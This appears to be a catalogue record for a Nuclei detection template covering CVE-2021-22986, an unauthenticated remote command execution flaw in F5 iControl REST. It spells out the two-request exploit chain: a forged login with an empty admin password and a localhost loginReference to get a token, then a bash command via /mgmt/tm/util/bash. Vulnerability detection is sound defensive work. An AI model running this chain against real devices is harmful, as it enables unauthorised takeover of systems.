---
cve_id: CVE-2021-22986
template_path: nuclei-templates/http/cves/2021/CVE-2021-22986.yaml
affected_product: F5 iControl REST
severity: critical
authentication: none
external_callback: false
affected_versions: BIG-IP 16.0.x before 16.0.1.1, 15.1.x before 15.1.2.1, 14.1.x before 14.1.4, 13.1.x before 13.1.3.6, and 12.1.x before 12.1.5.3; and BIG-IQ 7.1.0.x before 7.1.0.3 and 7.0.0.x before 7.0.0.2
preconditions: []
poc_classification: rce
---

## Vulnerability

F5 iControl REST interface is susceptible to unauthenticated remote command execution via SSRF (CWE-918). An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials. CVSS 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H). Impact includes unauthorized access, data leakage, and potential full system compromise.

## PoC / Detection

Classification: rce

The template executes a two-request chain to verify RCE:  
1. POST `/mgmt/shared/authn/login` using Basic `Authorization: YWRtaW46` (admin:), `Cookie: BIGIPAuthCookie=1234`, and JSON body with `loginReference` pointing to `http://localhost/mgmt/shared/gossip` to obtain `X-F5-Auth-Token` (extracted via internal regex).  
2. POST `/mgmt/tm/util/bash` with the token and `{"command":"run","utilCmdArgs":"-c id"}`.  
Matchers require both `commandResult` and `uid=` in the response body.

## References

- https://attackerkb.com/topics/J6pWeg5saG/k03009991-icontrol-rest-unauthenticated-remote-command-execution-vulnerability-cve-2021-22986
- https://support.f5.com/csp/article/K03009991
- http://packetstormsecurity.com/files/162059/F5-iControl-Server-Side-Request-Forgery-Remote-Command-Execution.html
- https://nvd.nist.gov/vuln/detail/CVE-2021-22986
- https://github.com/Miraitowa70/POC-Notes
